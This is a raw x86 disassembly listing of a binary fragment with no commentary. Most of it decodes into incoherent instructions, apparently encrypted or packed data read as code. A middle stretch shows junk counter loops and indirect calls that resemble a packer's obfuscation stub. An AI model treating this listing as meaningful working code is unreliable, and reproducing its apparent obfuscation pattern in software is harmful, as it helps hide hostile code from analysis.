  40d4f8:	repnz bound edi,QWORD PTR [ebx-0xf]
  40d4fc:	ficomp DWORD PTR [ecx+0x36df292a]
  40d502:	clc    
  40d503:	and    eax,0x7ee0754c
  40d508:	into   
  40d509:	(bad)  
  40d50a:	lock xacquire sub DWORD PTR cs:[esi-0xbfa1a00],edx
  40d513:	bound  eax,QWORD PTR [esi]
  40d515:	dec    esi
  40d516:	push   edi
  40d517:	sub    DWORD PTR [eax+esi*2-0x3639f641],ebp
  40d51e:	sub    BYTE PTR [edx+esi*8-0x39],0xc4
  40d523:	pop    edx
  40d524:	ret    0xed4a
  40d527:	enter  0xd4c7,0x33
  40d52b:	pusha  
  40d52c:	cmp    esi,edx
  40d52e:	cmc    
  40d52f:	call   0x941e:0xc3dd858c
  40d536:	add    al,0x60
  40d538:	in     eax,0xbd
  40d53a:	and    eax,edx
  40d53c:	sti    
  40d53d:	inc    ebp
  40d53e:	push   edi
  40d53f:	test   DWORD PTR [ebx+0xe],edx
  40d542:	pop    ds
  40d543:	popf   
  40d544:	call   0xa59d4a5a
  40d549:	push   esi
  40d54a:	inc    ebp
  40d54b:	js     0x40d515
  40d54d:	xor    al,0xd1
  40d54f:	mov    ebx,DWORD PTR [ebx-0x4b]
  40d552:	sbb    eax,0xf7cf5800
  40d557:	sub    bh,BYTE PTR [eax-0x9]
  40d55a:	test   eax,0x65d3e94a
  40d55f:	cld    
  40d560:	les    esp,FWORD PTR [edi+0xb8fd3c8]
  40d566:	push   edx
  40d567:	(bad)  
  40d568:	mov    gs,WORD PTR [esi-0x6d]
  40d56b:	out    dx,al
  40d56c:	enter  0xa592,0x25
  40d570:	(bad)  
  40d571:	fnstsw WORD PTR [edi+0x5e]
  40d574:	cmp    BYTE PTR [eax+0x3aeab3c8],ah
  40d57a:	lds    edi,FWORD PTR [ecx]
  40d57c:	aas    
  40d57d:	mov    esp,0x2cda379d
  40d582:	out    0x50,al
  40d584:	mov    edx,0x5476e5c6
  40d589:	pop    ecx
  40d58a:	mov    al,ds:0xead80094
  40d58f:	stos   BYTE PTR es:[edi],al
  40d590:	inc    esp
  40d591:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d592:	adc    dh,cl
  40d594:	pop    ds
  40d595:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d596:	enter  0x3f2a,0x99
  40d59a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d59b:	push   0xffffffa4
  40d59d:	sbb    eax,DWORD PTR [edx+ebp*1-0x47e33229]
  40d5a4:	push   edi
  40d5a5:	dec    ebx
  40d5a6:	mov    ebx,0x61d50f7f
  40d5ab:	sbb    ecx,DWORD PTR [ebx]
  40d5ad:	push   edx
  40d5ae:	jecxz  0x40d594
  40d5b0:	mov    bh,0x5a
  40d5b2:	mov    dh,cl
  40d5b4:	fist   DWORD PTR [eax+0x2b]
  40d5b7:	arpl   WORD PTR [edx],bp
  40d5b9:	cmc    
  40d5ba:	cmp    ebx,DWORD PTR [edx-0x22]
  40d5bd:	sbb    eax,0xae58f186
  40d5c2:	add    DWORD PTR [edi-0x75be96a7],edi
  40d5c8:	xchg   edi,eax
  40d5c9:	ins    DWORD PTR es:[edi],dx
  40d5ca:	or     BYTE PTR [ebx],al
  40d5cc:	pop    edi
  40d5cd:	or     ecx,DWORD PTR [eax]
  40d5cf:	daa    
  40d5d0:	mov    al,ds:0x5be1a238
  40d5d5:	in     eax,dx
  40d5d6:	ud1    ebp,DWORD PTR [ecx]
  40d5d9:	mov    bl,BYTE PTR [ebx-0x35]
  40d5dc:	fnstsw WORD PTR [esp+edx*1]
  40d5df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5e0:	sbb    DWORD PTR [edx+0x69],ebx
  40d5e3:	dec    ebp
  40d5e4:	jne    0x40d59f
  40d5e6:	xchg   BYTE PTR [edi-0x2f],dh
  40d5e9:	or     ch,BYTE PTR [eax+ebx*8+0x677993ff]
  40d5f0:	in     al,0x47
  40d5f2:	inc    ecx
  40d5f3:	pop    edi
  40d5f4:	mov    ah,0xc3
  40d5f6:	pop    ebp
  40d5f7:	(bad)  [ebx+ebx*2-0x7c]
  40d5fb:	xor    eax,0xabc82438
  40d600:	loop   0x40d58b
  40d602:	xor    bl,BYTE PTR [ebp+0x1a]
  40d605:	dec    ebp
  40d606:	pusha  
  40d607:	arpl   WORD PTR [ecx-0x18],bp
  40d60a:	jecxz  0x40d5e3
  40d60c:	repnz push 0x1c595ef5
  40d612:	sub    ecx,DWORD PTR [edx-0x4b3fd622]
  40d618:	push   ss
  40d619:	sbb    esp,DWORD PTR [ecx+eiz*2-0x5e357817]
  40d620:	gs push ebp
  40d622:	idiv   BYTE PTR [eax+0x292d66d]
  40d628:	or     al,dh
  40d62a:	or     al,0xa9
  40d62c:	lea    esp,[edi+ebp*2]
  40d62f:	icebp  
  40d630:	daa    
  40d631:	pop    eax
  40d632:	jp     0x40d640
  40d634:	adc    DWORD PTR [ebx-0x1f],ecx
  40d637:	ret    0x5342
  40d63a:	adc    BYTE PTR [ebp+0x3d],ch
  40d63d:	mov    esi,0x5e75a418
  40d642:	add    al,0xb8
  40d644:	mov    ebx,0xb9596a05
  40d649:	jne    0x40d5f3
  40d64b:	inc    eax
  40d64c:	add    eax,0xd5927da2
  40d651:	xchg   ebp,eax
  40d652:	call   0x435f2f2a
  40d657:	pop    ds
  40d658:	mov    ecx,0x587deb6d
  40d65d:	mov    cl,0xe
  40d65f:	ja     0x40d671
  40d661:	jp     0x40d683
  40d663:	clc    
  40d664:	sbb    ah,bl
  40d666:	pop    ss
  40d667:	dec    ecx
  40d668:	cld    
  40d669:	ja     0x40d68b
  40d66b:	mov    dl,0x61
  40d66d:	mov    al,ds:0xbca72279
  40d672:	and    edi,ecx
  40d674:	sub    ecx,DWORD PTR [edi-0x2c]
  40d677:	gs mov bl,ch
  40d67a:	inc    esp
  40d67b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d67c:	lahf   
  40d67d:	xchg   BYTE PTR [ebx],ah
  40d67f:	out    dx,al
  40d680:	(bad)  
  40d681:	mov    dl,0xd5
  40d683:	add    edx,DWORD PTR [eax]
  40d685:	arpl   dx,si
  40d687:	sub    BYTE PTR [ebx-0x2d9e5503],bl
  40d68d:	mov    ah,0xfc
  40d68f:	imul   ecx,DWORD PTR [ebx],0xffffff82
  40d692:	test   eax,0xdfb93138
  40d697:	and    DWORD PTR [ecx-0x431b1502],ebp
  40d69d:	jne    0x40d6bd
  40d69f:	sub    edx,DWORD PTR [eax]
  40d6a1:	xchg   ebx,eax
  40d6a2:	inc    ebx
  40d6a3:	pop    esp
  40d6a4:	in     eax,dx
  40d6a5:	or     bh,BYTE PTR [ecx+0x2783ad04]
  40d6ab:	jae    0x40d65f
  40d6ad:	dec    edx
  40d6ae:	mov    eax,0xfc548270
  40d6b3:	xlat   BYTE PTR ds:[ebx]
  40d6b4:	idiv   DWORD PTR [edx-0x7]
  40d6b7:	pop    edi
  40d6b8:	adc    DWORD PTR [ebx],esp
  40d6ba:	(bad)
  40d6bd:	js     0x40d677
  40d6bf:	push   edi
  40d6c0:	sub    al,0xa7
  40d6c2:	sub    eax,0x1395132f
  40d6c7:	dec    ecx
  40d6c8:	push   ebx
  40d6c9:	fs fwait
  40d6cb:	cmp    bh,BYTE PTR [ebx]
  40d6cd:	xor    eax,DWORD PTR [ebx-0x38]
  40d6d0:	jg     0x40d664
  40d6d2:	push   0x7840fa6f
  40d6d7:	xchg   ebp,eax
  40d6d8:	jno    0x40d6c4
  40d6da:	lea    ebx,[edx-0x52]
  40d6dd:	push   ds
  40d6de:	pop    esp
  40d6df:	shr    bh,1
  40d6e1:	lahf   
  40d6e2:	jmp    0x69a6:0x62e2b413
  40d6e9:	out    dx,eax
  40d6ea:	out    0x1e,al
  40d6ec:	pop    ebx
  40d6ed:	test   eax,0xd18d276e
  40d6f2:	inc    esp
  40d6f3:	mov    ebx,0xb499065e
  40d6f8:	(bad)  
  40d6f9:	lahf   
  40d6fa:	mov    ecx,0x4573
  40d6ff:	add    edx,ecx
  40d701:	not    esi
  40d703:	mov    esi,0x7879
  40d708:	or     edi,0x6bdc
  40d70e:	mov    edi,0x1556
  40d713:	sub    DWORD PTR ds:0x43441d,0x432dde
  40d71d:	xchg   esi,ecx
  40d71f:	sub    edx,edi
  40d721:	xor    DWORD PTR ds:0x434411,0x1648
  40d72b:	xor    esi,esi
  40d72d:	and    DWORD PTR ds:0x432dca,0x0
  40d737:	jmp    0x40d749
  40d73c:	mov    ecx,DWORD PTR ds:0x432dca
  40d742:	inc    ecx
  40d743:	mov    DWORD PTR ds:0x432dca,ecx
  40d749:	cmp    DWORD PTR ds:0x432dca,0x11
  40d750:	jae    0x40d7ce
  40d756:	cmp    DWORD PTR ds:0x432dca,0x1e
  40d75d:	jne    0x40d76e
  40d763:	push   0x470a
  40d768:	call   DWORD PTR ds:0x432c72
  40d76e:	jmp    0x40d73c
  40d773:	and    DWORD PTR ds:0x434386,0x0
  40d77d:	mov    ecx,DWORD PTR ds:0x434386
  40d783:	inc    ecx
  40d784:	mov    DWORD PTR ds:0x434386,ecx
  40d78a:	cmp    DWORD PTR ds:0x434386,0xa
  40d791:	jne    0x40d7a7
  40d797:	push   0x4328db
  40d79c:	push   0x43287d
  40d7a1:	call   DWORD PTR ds:0x4329f6
  40d7a7:	cmp    DWORD PTR ds:0x434386,0x9
  40d7ae:	jne    0x40d7c1
  40d7b4:	mov    ecx,DWORD PTR ds:0x434386
  40d7ba:	inc    ecx
  40d7bb:	mov    DWORD PTR ds:0x434386,ecx
  40d7c1:	cmp    DWORD PTR ds:0x434386,0x18
  40d7c8:	jb     0x40d77d
  40d7ce:	mov    DWORD PTR [ebp-0x28],esi
  40d7d1:	mov    DWORD PTR [ebp-0x2c],esi
  40d7d4:	and    DWORD PTR ds:0x434396,0x0
  40d7de:	jmp    0x40d7f0
  40d7e3:	mov    ecx,DWORD PTR ds:0x434396
  40d7e9:	inc    ecx
  40d7ea:	mov    DWORD PTR ds:0x434396,ecx
  40d7f0:	cmp    DWORD PTR ds:0x434396,0x1f
  40d7f7:	jae    0x40d83c
  40d7fd:	cmp    DWORD PTR ds:0x434396,0x11
  40d804:	jne    0x40d813
  40d80a:	push   DWORD PTR [ebp-0x28]
  40d80d:	call   DWORD PTR ds:0x4329fa
  40d813:	cmp    DWORD PTR ds:0x434396,0x10
  40d81a:	jne    0x40d82d
  40d820:	mov    ecx,DWORD PTR ds:0x434396
  40d826:	inc    ecx
  40d827:	mov    DWORD PTR ds:0x434396,ecx
  40d82d:	jmp    0x40d7e3
  40d832:	or     DWORD PTR ds:0x432de2,0x1ed3
  40d83c:	mov    DWORD PTR [ebp-0x14],esi
  40d83f:	adc    DWORD PTR ds:0x432704,0x1c7c
  40d849:	jmp    0x40dc3d
  40d84e:	addr16 int3 
  40d850:	ss data16 mov cl,0x62
  40d854:	ja     0x40d81f
  40d856:	or     bl,BYTE PTR [esi-0x3c]
  40d859:	in     al,0x6e
  40d85b:	xchg   edi,eax
  40d85c:	sbb    esp,DWORD PTR [edi+edx*2]
  40d85f:	mov    dh,BYTE PTR [eax+0x70]
  40d862:	dec    ecx
  40d863:	jge    0x40d8d5
  40d865:	jo     0x40d8a3
  40d867:	adc    eax,0xbb784d18
  40d86c:	cmp    ecx,DWORD PTR [esi-0x2d]
  40d86f:	dec    esp
  40d870:	mov    ecx,es
  40d872:	test   eax,0x15ac34d5
  40d877:	xor    dl,ah
  40d879:	lods   al,BYTE PTR ds:[esi]
  40d87a:	mov    eax,0xe15d2ca8
  40d87f:	in     al,0x47
  40d881:	test   esp,ecx
  40d883:	mov    dh,0x7b
  40d885:	int3   
  40d886:	retf   0x6a13
  40d889:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d88a:	inc    esi
  40d88b:	sub    al,0x3
  40d88d:	push   es
  40d88e:	test   al,0x98
  40d890:	int    0xdc
  40d892:	push   esp
  40d893:	cmp    eax,0xda3f32f5
  40d898:	pop    ds
  40d899:	arpl   WORD PTR [edi],sp
  40d89b:	test   al,0xf4
  40d89d:	mov    ds,WORD PTR [esi-0x213a881c]
  40d8a3:	xor    al,0x6f
  40d8a5:	push   esi
  40d8a6:	into   
  40d8a7:	dec    edx
  40d8a8:	cmp    ah,BYTE PTR [edx+0x46]
  40d8ab:	outs   dx,DWORD PTR ds:[esi]
  40d8ac:	in     eax,0x2d
  40d8ae:	sub    al,0xfa
  40d8b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8b1:	call   0x4f0075ee
  40d8b6:	ja     0x40d86d
  40d8b8:	ret    
  40d8b9:	inc    eax
  40d8ba:	jns    0x40d921
  40d8bc:	js     0x40d93d
  40d8be:	(bad)  
  40d8bf:	out    0xf9,al
  40d8c1:	shl    esi,cl
  40d8c3:	out    dx,eax
  40d8c4:	fwait
  40d8c5:	pop    ecx
  40d8c6:	inc    eax
  40d8c7:	dec    eax
  40d8c8:	lock adc DWORD PTR [edi],edi
  40d8cb:	mov    al,ds:0x731d63c9
  40d8d0:	xchg   DWORD PTR [edx+ecx*2-0x2712d1df],edi
  40d8d7:	mov    cl,ah
  40d8d9:	add    ebp,ebx
  40d8db:	cmp    al,0xa6
  40d8dd:	adc    al,BYTE PTR [ebp+0x48]
  40d8e0:	ins    DWORD PTR es:[edi],dx
  40d8e1:	sbb    al,BYTE PTR [eax]
  40d8e3:	popf   
  40d8e4:	rcl    cl,0xb7
  40d8e7:	addr16 inc esi
  40d8e9:	push   ds
  40d8ea:	popa   
  40d8eb:	push   ebx
  40d8ec:	(bad)  
  40d8ed:	push   0xee827017
  40d8f2:	call   0xd984:0x11555d4a
  40d8f9:	loope  0x40d956
  40d8fb:	jle    0x40d90a
  40d8fd:	mov    dl,0xd2
  40d8ff:	add    al,0xa7
  40d901:	xor    DWORD PTR [esp+eiz*8],ebx
  40d904:	cmp    bl,BYTE PTR [eax]
  40d906:	dec    edi
  40d907:	mov    ds:0xd9831e14,al
  40d90c:	mov    dl,0x38
  40d90e:	xor    BYTE PTR [esi*2+0x39be3f29],0x77
  40d916:	ja     0x40d969
  40d918:	pop    ss
  40d919:	mov    al,ds:0xe068f5c1
  40d91e:	push   ebp
  40d91f:	mov    edi,0x1f75414a
  40d924:	jmp    0x2852:0xfdb7946f
  40d92b:	sub    ebp,DWORD PTR [edi]
  40d92d:	cdq    
  40d92e:	jne    0x40d914
  40d930:	scas   al,BYTE PTR es:[edi]
  40d931:	(bad)  [eax+0x7]
  40d934:	in     eax,dx
  40d935:	test   BYTE PTR [esi],al
  40d937:	dec    edi
  40d938:	inc    edi
  40d939:	xchg   esi,eax
  40d93a:	pop    ebp
  40d93b:	push   ss
  40d93c:	mov    ds:0x7c6ef85c,eax
  40d941:	inc    esi
  40d942:	test   DWORD PTR [edx],edx
  40d944:	popa   
  40d945:	shr    BYTE PTR [eax+0x37],1
  40d948:	icebp  
  40d949:	inc    edi
  40d94a:	std    
  40d94b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d94c:	dec    eax
  40d94d:	std    
  40d94e:	into   
  40d94f:	pop    eax
  40d950:	or     al,0x95
  40d952:	jp     0x40d8ea
  40d954:	scas   al,BYTE PTR es:[edi]
  40d955:	sub    DWORD PTR [eax],0xffffffcc
  40d958:	cmp    al,dh
  40d95a:	sub    ch,cl
  40d95c:	jle    0x40d9d8
  40d95e:	lahf   
  40d95f:	add    esp,DWORD PTR [edi]
  40d961:	pushf  
  40d962:	dec    ebp
  40d963:	mov    dl,BYTE PTR [eax]
  40d965:	or     eax,0x4ce89030
  40d96a:	stos   BYTE PTR es:[edi],al
  40d96b:	adc    al,0xe3
  40d96d:	mov    cl,0xe8
  40d96f:	inc    esi
  40d970:	js     0x40d986
  40d972:	in     al,dx
  40d973:	and    ah,cl
  40d975:	imul   esi,DWORD PTR [ebx],0x43bd4d2a
  40d97b:	mov    es,WORD PTR [ecx+0x185d0df3]
  40d981:	enter  0x6d6b,0x92
  40d985:	mov    al,ds:0xfa0268d
  40d98a:	jno    0x40d9bb
  40d98c:	popa   
  40d98d:	mov    esi,0xdde04ee2
  40d992:	push   ecx
  40d993:	je     0x40d953
  40d995:	cs or  BYTE PTR es:[ebx],dl
  40d999:	inc    ecx
  40d99a:	std    
  40d99b:	sbb    dh,bl
  40d99d:	stos   BYTE PTR es:[edi],al
  40d99e:	iret   
  40d99f:	sub    al,0x16
  40d9a1:	sub    DWORD PTR [eax+eiz*2],esi
  40d9a4:	push   ecx
  40d9a5:	cmp    bh,BYTE PTR [esi]
  40d9a7:	lds    edx,FWORD PTR [edi-0x7b]
  40d9aa:	dec    ecx
  40d9ab:	jmp    0x608d6631
  40d9b0:	push   ss
  40d9b1:	mov    eax,0x9593af20
  40d9b6:	pusha  
  40d9b7:	cmp    ebx,DWORD PTR [ecx+ebp*1]
  40d9ba:	xor    esp,DWORD PTR [ebx+0x4a24a7c4]
  40d9c0:	jb     0x40d9aa
  40d9c2:	ret    0xd1ff
  40d9c5:	push   esi
  40d9c6:	adc    esp,DWORD PTR [edi-0x72b97642]
  40d9cc:	bound  edx,QWORD PTR [esp+edi*2-0x550c3ac2]
  40d9d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9d4:	addr16 mov cl,ah
  40d9d7:	mov    bh,BYTE PTR [eax*8-0x355fb897]
  40d9de:	push   esp
  40d9df:	fcom   DWORD PTR [ebp-0x53]
  40d9e2:	pop    edx
  40d9e3:	sub    BYTE PTR ds:0xa154a99c,0x31
  40d9ea:	and    DWORD PTR [edx],edx
  40d9ec:	jp     0x40da49
  40d9ee:	clc    
  40d9ef:	mov    al,ds:0x4e88ad88
  40d9f4:	add    al,BYTE PTR [ebx+0x18b83ac2]
  40d9fa:	add    ah,BYTE PTR [edx-0x2e94ccc0]
  40da00:	fsubr  QWORD PTR [edx-0x4e52cc89]
  40da06:	and    edx,DWORD PTR ds:0xbac48f09
  40da0c:	push   ebx
  40da0d:	jmp    0x669daa4d
  40da12:	xor    DWORD PTR [eax],0xaf44b397
  40da18:	mov    esp,0x2748072d
  40da1d:	mov    eax,ds:0xeeac3b44
  40da22:	mov    al,0xe0
  40da24:	push   ebp
  40da25:	mov    esp,0x373ffcf7
  40da2a:	ja     0x40d9ff
  40da2c:	pusha  
  40da2d:	or     dl,dl
  40da2f:	xor    al,0x9b
  40da31:	mov    ds:0x6f0862d2,eax
  40da36:	loopne 0x40da2a
  40da38:	sub    al,0x50
  40da3a:	lods   al,BYTE PTR ds:[esi]
  40da3b:	mov    dl,0xd9
  40da3d:	sti    
  40da3e:	stc    
  40da3f:	test   BYTE PTR [edx-0x2bcce4c5],0x4d
  40da46:	mov    esp,0x8f84236d
  40da4b:	lock rcr DWORD PTR [ebx-0x19f6e5f0],cl
  40da52:	mov    eax,0x1e938fb0
  40da57:	lods   al,BYTE PTR ds:[esi]
  40da58:	cmp    al,0x48
  40da5a:	jmp    0x40da22
  40da5c:	add    eax,0xb23f82b1
  40da61:	and    bh,BYTE PTR ss:[edx-0x27]
  40da65:	inc    edi
  40da66:	push   0x3a
  40da68:	add    DWORD PTR [ebx+eax*2],0x56e335e8
  40da6f:	loop   0x40daea
  40da71:	gs sbb al,0xd6
  40da74:	(bad)  
  40da76:	hlt    
  40da77:	fadd   DWORD PTR ds:0xcd618339
  40da7d:	mov    ebp,0x31d9da50
  40da82:	pop    edx
  40da83:	push   0x294b86ba
  40da88:	maskmovq mm7,mm2
  40da8b:	xor    DWORD PTR [ebx],ecx
  40da8d:	push   es
  40da8e:	fsub   QWORD PTR [ebp-0x20869313]
  40da94:	in     al,dx
  40da95:	es mov ecx,0x9e3d86ba
  40da9b:	jnp    0x40dac8
  40da9d:	ficomp WORD PTR [eax]
  40da9f:	ss dec eax
  40daa1:	inc    ebx
  40daa2:	jbe    0x40da6d
  40daa4:	push   eax
  40daa5:	data16 jb 0x40da6c
  40daa8:	enter  0x2e94,0x35
  40daac:	(bad)  
  40daad:	mov    dl,0xe2
  40daaf:	scas   al,BYTE PTR es:[edi]
  40dab0:	jge    0x40dab7
  40dab2:	ret    
  40dab3:	ficomp WORD PTR [edi+0x205cb521]
  40dab9:	cmp    esi,ebp
  40dabb:	or     al,0xaf
  40dabd:	inc    esi
  40dabe:	enter  0x2d5,0xa4
  40dac2:	mov    bh,BYTE PTR [eax]
  40dac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dac5:	push   edi
  40dac6:	jecxz  0x40db1c
  40dac8:	retf   
  40dac9:	pop    esp
  40daca:	push   cs
  40dacb:	(bad)  
  40dacc:	repz jnp 0x40db4b
  40dacf:	or     esi,esp
  40dad1:	ds inc eax
  40dad3:	mov    ebx,0x53ff0052
  40dad8:	shl    ebp,0xce
  40dadb:	call   FWORD PTR [eax+esi*8+0x6a116d18]
  40dae2:	stos   BYTE PTR es:[edi],al
  40dae3:	push   0x6796c25f
  40dae8:	data16 jle 0x40da79
  40daeb:	ficomp DWORD PTR [ecx+0x16]
  40daee:	fcomi  st,st(3)
  40daf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40daf1:	add    al,0xf8
  40daf3:	mov    ds:0xc39e3a11,eax
  40daf8:	or     DWORD PTR [edi],ebp
  40dafa:	ins    BYTE PTR es:[edi],dx
  40dafb:	fisttp DWORD PTR [edi+edx*8+0x20]
  40daff:	or     DWORD PTR [esi],ecx
  40db01:	arpl   si,cx
  40db03:	pop    ebp
  40db04:	jno    0x40db20
  40db06:	sbb    DWORD PTR [edi],edx
  40db08:	xchg   esp,eax
  40db09:	lea    esi,[ebp+0x57]
  40db0c:	retf   
  40db0d:	lods   eax,DWORD PTR ds:[esi]
  40db0e:	pop    ebx
  40db0f:	es (bad) 
  40db11:	jmp    0x60dc388a
  40db16:	and    eax,0xc471799c
  40db1b:	in     eax,dx
  40db1c:	xchg   ebx,eax
  40db1d:	pusha  
  40db1e:	xchg   ecx,eax
  40db1f:	jge    0x40dafd
  40db21:	ret    0x33a1
  40db24:	rcl    DWORD PTR [edx],0x9c
  40db27:	and    ebx,ebp
  40db29:	dec    esp
  40db2a:	and    eax,0x45f22bde
  40db2f:	fs in  al,0x88
  40db32:	pcmpeqb mm5,QWORD PTR [esi+0x2addf6b9]
  40db39:	and    al,0xd2
  40db3b:	mov    esi,0xc4525dc3
  40db40:	call   0x8bc80f7e
  40db45:	lods   al,BYTE PTR ds:[esi]
  40db46:	or     al,0xc7
  40db48:	cmc    
  40db49:	outs   dx,DWORD PTR ds:[esi]
  40db4a:	jae    0x40db96
  40db4c:	dec    ebp
  40db4d:	pop    edx
  40db4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db4f:	mov    eax,0x3d61c0d2
  40db54:	fs dec edx
  40db56:	pop    edi
  40db57:	adc    al,BYTE PTR [ebp+0x308fe694]
  40db5d:	inc    esi
  40db5e:	sbb    al,BYTE PTR [edi-0x7b9cea06]
  40db64:	imul   esp,DWORD PTR [edx+0x18],0x75
  40db68:	sub    al,0xfd
  40db6a:	addr16 jg 0x40db15
  40db6d:	xchg   edi,eax
  40db6e:	dec    esi
  40db6f:	ins    DWORD PTR es:[edi],dx
  40db70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db71:	cmp    BYTE PTR [ebp+0x3fcaa578],dl
  40db77:	jmp    0x5c61:0x22fcec6a
  40db7e:	jl     0x40db81
  40db80:	adc    eax,0x9105ef50
  40db85:	out    dx,eax
  40db86:	lods   al,BYTE PTR ds:[esi]
  40db87:	mov    ds:0x4a535c23,al
  40db8c:	gs push es
  40db8e:	mov    WORD PTR [ecx],?
  40db90:	mov    cl,0xd4
  40db92:	jl     0x40dbe9
  40db94:	enter  0xf997,0x71
  40db98:	ret    
  40db99:	push   0x58d27a04
  40db9e:	mov    esi,DWORD PTR [edx-0x2d]
  40dba1:	out    dx,al
  40dba2:	add    ebx,DWORD PTR [esp+ebx*1]
  40dba5:	cmp    DWORD PTR [esi+0x18],edx
  40dba8:	lock xchg esp,eax
  40dbaa:	repz loope 0x40dbac
  40dbad:	shr    esi,1
  40dbaf:	push   cs
  40dbb0:	sbb    bh,cl
  40dbb2:	in     al,dx
  40dbb3:	inc    edx
  40dbb4:	mov    eax,ds:0x36c430f3
  40dbb9:	sub    cl,cl
  40dbbb:	in     al,0xa8
  40dbbd:	fmul   QWORD PTR [eax]
  40dbbf:	daa    
  40dbc0:	nop
  40dbc1:	push   ss
  40dbc2:	int3   
  40dbc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbc4:	hlt    
  40dbc5:	sbb    BYTE PTR ds:0x45dc4afa,bh
  40dbcb:	outs   dx,BYTE PTR ds:[esi]
  40dbcc:	push   es
  40dbcd:	lods   al,BYTE PTR ds:[esi]
  40dbce:	mov    eax,ds:0xbedab3b7
  40dbd3:	out    0x5d,al
  40dbd5:	dec    eax
  40dbd6:	jge    0x40dba0
  40dbd8:	mov    bh,0xd4
  40dbda:	fcomp  DWORD PTR [eax+0x31abe0a5]
  40dbe0:	sub    BYTE PTR [eax],dl
  40dbe2:	mov    ebp,0xee873a39
  40dbe7:	sbb    al,0x18
  40dbe9:	fcmovnbe st,st(5)
  40dbeb:	cmc    
  40dbec:	(bad)  
  40dbed:	sbb    BYTE PTR [ebp+0x1a569503],cl
  40dbf3:	fcomp  DWORD PTR [esi]
  40dbf5:	adc    BYTE PTR [edi],bl
  40dbf7:	cmp    BYTE PTR [ebx],bl
  40dbf9:	push   esi
  40dbfa:	int    0x1
  40dbfc:	out    0x97,eax
  40dbfe:	xchg   edx,eax
  40dbff:	pushf  
  40dc00:	shl    BYTE PTR [esi-0x4fb2d4f],1
  40dc06:	jbe    0x40dc7d
  40dc08:	or     eax,0x72a262cc
  40dc0d:	in     eax,0x35
  40dc0f:	add    al,0x3
  40dc11:	test   DWORD PTR [eax+0x565ca873],edx
  40dc17:	pop    ebx
  40dc18:	pop    ebx
  40dc19:	and    eax,0xf38fcf0b
  40dc1e:	cdq    
  40dc1f:	add    DWORD PTR [ebp+0x62d7b5b9],0xfffffff8
  40dc26:	pop    edx
  40dc27:	pop    edx
  40dc28:	daa    
  40dc29:	or     eax,0x66cfdc76
  40dc2e:	jb     0x40dc5f
  40dc30:	add    esi,DWORD PTR [ebx-0x58b8787e]
  40dc36:	lahf   
  40dc37:	sub    DWORD PTR [esi+0x3151ac98],eax
  40dc3d:	mov    DWORD PTR [ebp-0x8],esi
  40dc40:	mov    ecx,DWORD PTR ds:0x43439a
  40dc46:	and    DWORD PTR ds:0x432dc6,ecx
  40dc4c:	mov    ecx,DWORD PTR [ebp-0x18]
  40dc4f:	and    DWORD PTR ds:0x4326f8,0x434411
  40dc59:	xor    ecx,eax
  40dc5b:	jmp    0x40e04f
  40dc60:	mov    bl,0x93
  40dc62:	iret   
  40dc63:	(bad)
  40dc66:	mov    cl,0x71
  40dc68:	out    0x43,eax
  40dc6a:	fs jb  0x40dc20
  40dc6d:	cwde   
  40dc6e:	jns    0x40dc38
  40dc70:	mov    al,ds:0x49707096
  40dc75:	jge    0x40dce7
  40dc77:	jo     0x40dcdd
  40dc79:	mov    ds:0xf6f41956,eax
  40dc7e:	test   BYTE PTR [ebp+0x2d480281],dl
  40dc84:	test   eax,0x50e96754
  40dc89:	xor    eax,0x52ded920
  40dc8e:	sbb    cl,BYTE PTR [ecx-0x4cf0c70b]
  40dc94:	cli    
  40dc95:	or     ch,bl
  40dc97:	loopne 0x40dc8f
  40dc99:	das    
  40dc9a:	dec    edx
  40dc9b:	or     DWORD PTR [eax-0x4cf65b],edi
  40dca1:	pushf  
  40dca2:	pop    esp
  40dca3:	mov    ebx,0xab2f394a
  40dca9:	push   esp
  40dcaa:	or     ecx,DWORD PTR [eax]
  40dcac:	aad    0xf3
  40dcae:	push   0xcd71565d
  40dcb3:	xor    al,BYTE PTR [edi+0x11]
  40dcb6:	and    al,0x3e
  40dcb8:	or     esp,esp
  40dcba:	out    dx,eax
  40dcbb:	int    0x87
  40dcbd:	xor    ch,BYTE PTR [ecx+0x3e]
  40dcc0:	in     eax,0xcf
  40dcc2:	or     ecx,edx
  40dcc4:	sbb    BYTE PTR [ecx+0x726372d0],dh
  40dcca:	cmp    DWORD PTR [ebp+0x2d6ba786],esi
  40dcd0:	mov    dh,0xac
  40dcd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcd3:	int3   
  40dcd4:	lds    ecx,FWORD PTR [ecx-0x241271cc]
  40dcda:	ins    DWORD PTR es:[edi],dx
  40dcdb:	dec    ecx
  40dcdc:	push   esp
  40dcdd:	sbb    esi,DWORD PTR [ebp-0x6b]
  40dce0:	mov    bh,0xbd
  40dce2:	js     0x40dd62
  40dce4:	and    BYTE PTR [ecx],0xf0
  40dce7:	push   esp
  40dce8:	adc    cl,al
  40dcea:	imul   edi,DWORD PTR [edx+0x734db4f8],0x3a774d21
  40dcf4:	add    esi,eax
  40dcf6:	pushf  
  40dcf7:	scas   al,BYTE PTR es:[edi]
  40dcf8:	inc    ebp
  40dcf9:	rcr    ch,0xa7
  40dcfc:	cmp    DWORD PTR [ecx+0x58d3c480],ebx
  40dd02:	hlt    
  40dd03:	add    edi,edi
  40dd05:	xor    al,0xe3
  40dd07:	lock and al,0x72
  40dd0a:	adc    bl,bh
  40dd0c:	mov    ah,0xf1
  40dd0e:	scas   eax,DWORD PTR es:[edi]
  40dd0f:	repz xchg esp,eax
  40dd11:	cld    
  40dd12:	push   cs
  40dd13:	mov    edi,0xb56e3b4b
  40dd18:	retf   0x1526
  40dd1b:	sub    BYTE PTR [edx],bl
